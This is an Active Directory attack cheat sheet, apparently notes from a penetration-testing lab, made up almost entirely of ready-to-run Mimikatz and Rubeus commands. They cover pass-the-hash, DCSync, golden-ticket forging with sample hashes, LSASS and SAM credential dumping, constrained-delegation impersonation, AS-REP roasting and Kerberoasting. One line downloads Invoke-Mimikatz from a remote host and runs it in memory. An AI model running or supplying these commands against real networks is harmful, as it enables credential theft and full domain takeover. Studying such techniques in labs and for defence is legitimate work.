### Mimikatz Pass-the-hash**

`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.funcorp.local /ntlm:6abb7b261387f51b8e58261aa310e245 /run:powershell.exe"'`

### Mimikatz Dump hash user specific**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:AMAZECORP.local /user:PSPEARS"'
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:fortress.corp /all"'
```

### Mimikatz use in memory**

`IEX (New-Object Net.WebClient).DownloadString('http://192.168.240.201/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'`

### Mimikatz Ticket Dourado**

```

Sids: Sid Domain Attacked (Get-NetGroupMember -GroupName "Domain Admins" -domanin $domain attcked)

Sid: Did Domain Local
krbtg: hash domain local

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.funcorp.local /sid:S-1-5-21-3965405831-1015596948-2589850225 /sids:S-1-5-21-493355955-4215530352-779396340-519 /krbtgt:c6d34958b79e829bede03fcb79cd1f5a /ticket:C:\AD\krbtgt_tkt.kirbi"'

```

### Mimikatz Inject Ticket**

`Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\studentuser\Desktop\tools\tickets\FORTRESS.CORP.kirbi"'`

### Mimikatz Dump hash loca**l

```
Privilege elevate with SYSTEM

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

Not Elevate

Invoke-Mimikatz -Command '"privilege::debug""sekurlsa::logonpasswords" "lsadump::sam" "exit"'

```

### Mimikatz dump hashs Domain**

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::sam /patch"'
```

### Check a  valid msds-allowedtodelegateto**

`Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto`

### Rubeus Impersonate Ticket Constrained Delegation to administrator**

```
rc4: hash account user
Impersonateuser: account will be impersonate
altservice: service will be impersonate

TCP 5985 = HTTP and  TCP 5986 = HTTPS

.\Rubeus.exe s4u /user:dbservice /rc4:6f9e22a64970f32bd0d86fddadc8b8b5 /impersonateuser:administrator /msdsspn:"TIME/UFC-DC1.US.FUNCORP.LOCAL" /altservice:cifs /ptt

.\Rubeus.exe s4u /user:dbservice /rc4:6f9e22a64970f32bd0d86fddadc8b8b5 /impersonateuser:administrator /msdsspn:"TIME/UFC-DC1.US.FUNCORP.LOCAL" /altservice:http /ptt

https://github.com/GhostPack/Rubeus
```

### Rubeus check accounts with flag "do not require kerberos preauthentication"**

```
Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt

Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN]

.\Rubeus.exe asreproast /domain:techvirtua.local /dc:192.168.2.201 /creduser:techvirtua.local\thiago.oliveira /credpassword:BadPass123 /format:hashcat

```

### Usage mimikatz.exe**

```
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

```

### check account that can be used to kerberoast**

`get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}`

### Solicit ticket TGS**

```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HOST/fortress-secure.fortress.corp"

```

###  Export ticket with mimikatz**
`Invoke-Mimikatz -Command '"kerberos::list /export"'`

### Convert ticket Kirbi**

`python.exe .\kirbi2john.py .\3-40a10000-pastudent138@TIME~UFC-DB1.US.FUNCORP.LOCAL-US.FUNCORP.LOCAL.kirbi`

### Search kerberos pre auth disabled**

```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser -PreauthNotRequired -Verbose
```

### Type Services**

![services.png](services.png)
